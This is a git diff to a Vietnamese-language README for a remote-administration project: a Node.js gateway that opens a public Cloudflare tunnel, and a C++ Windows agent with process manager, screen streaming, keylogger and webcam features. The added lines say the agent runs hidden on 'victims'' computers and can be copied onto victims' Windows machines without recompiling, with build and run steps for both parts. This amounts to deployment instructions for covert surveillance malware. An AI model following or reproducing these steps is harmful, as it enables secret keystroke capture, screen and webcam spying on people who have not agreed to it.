@@ -47,13 +47,15 @@ Tính năng nổi bật:
 - Gateway: Node.js v14 trở lên.
 - Development: VS Code.
 
-### 3.2. Hướng dẫn chạy (Step-by-Step)
+### 3.2. Hướng dẫn chạy lần đầu(Step-by-Step)
 **Bước 1: Khởi động Gateway (Server)**
 Mở Terminal tại thư mục gateway/:
 ```text
 npm install  # Cài đặt các gói phụ thuộc (lần đầu)
-node gateway.js
+npm run build # Tạo ra file `gateway.exe`
 ```
+- Chạy file `gateway.exe`.
+- Có thể copy file `gateway.exe` này sang máy khác để chạy mà không cần biên dịch lại.
 - Gateway sẽ tự động tạo đường dẫn Public (ví dụ: `https://xyz-abc.trycloudflare.com`).
 - Copy đường dẫn này để truy cập từ xa.
 
@@ -63,8 +65,9 @@ Mở Terminal tại thư mục agent/:
 build.bat   # Biên dịch mã nguồn C++ (nếu chưa có file exe)
 agent.exe   # Chạy Agent
 ```
+- `agent.exe` sẽ chạy ẩn trong máy tính của victims, cần bật Task Manager để tắt.
+- Có thể copy file `agent.exe` này vào máy victims (yêu cầu chạy Window) để chạy mà không cần biên dịch lại.
 - Agent sẽ tự động quét mạng LAN (UDP) để tìm Gateway.
-- Khi thấy dòng thông báo `[Agent] Connected to gateway`, kết nối đã thiết lập thành công.
 - Có thể chạy nhiều Agent trên các máy khác nhau để kết nối đến cùng một Gateway.
 
 **Bước 3: Điều khiển**
@@ -73,6 +76,7 @@ agent.exe   # Chạy Agent
 - Nhấn nút **Scan** để xem danh sách tất cả Agent đang kết nối (hiển thị IP, hostname, OS).
 - Click chọn Agent muốn điều khiển (Agent được chọn sẽ có highlight màu cyan).
 - Bắt đầu sử dụng các tính năng (Process Manager, Screen Stream, Keylogger, Webcam...).
+
 
 ## 4. Cấu trúc thư mục
 ```text
